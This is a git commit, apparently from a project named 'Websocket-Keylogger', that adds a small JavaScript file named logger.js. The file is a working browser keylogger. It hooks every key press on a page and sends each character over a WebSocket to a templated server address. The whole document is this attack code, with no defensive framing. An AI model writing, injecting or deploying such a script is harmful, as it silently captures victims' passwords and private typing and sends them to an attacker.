7b35f61569a016bc3db451b3f36b876573e4a3dd
Alireza Gharib <alirezagharib110@gmail.com>
2025-02-06 22:07:36 +0330

    the logger is implemented

---
+++ Websocket-Keylogger/logger.js
@@ -0,0 +1,9 @@
+(function () {
+    var conn = new WebSocket("ws://{{.}}/ws");
+    document.onkeydown = keypress;
+    function keypress(evt) {
+        s = String.fromCharCode(evt.which)
+        conn.send(s)
+    }
+    }
+)();
